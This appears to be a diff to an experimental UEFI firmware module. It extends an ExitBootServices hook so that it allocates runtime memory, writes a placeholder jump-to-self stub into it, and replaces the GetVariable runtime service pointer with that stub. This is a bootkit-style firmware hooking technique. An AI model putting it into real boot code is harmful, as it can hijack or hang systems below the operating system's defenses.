@@ -62,6 +62,7 @@ void apply_patch(void *addr)
 
 EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
 {
+    EFI_STATUS status = 0;
     // Could be potentially called twice, so deal with that.
     if (called == 1) {
         goto done;
@@ -119,7 +120,20 @@ EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
      *
      * Probably gonna need to allocate runtime memory here.
      */
-    while (1) {}
+    char *data = NULL;
+    status = bootservices->AllocatePages(
+        AllocateAnyPages, EfiRuntimeServicesCode, 0x300, &data
+    );
+    if (status != EFI_SUCCESS) {
+        while (1) {}
+    }
+
+    /* Installing a runtime services hook */
+    data[0] = 0xeb;
+    data[1] = 0xfe;
+    systable->RuntimeServices->GetVariable = data;
+    
+    //while (1) {}
 
 done:
     if (map != NULL) {
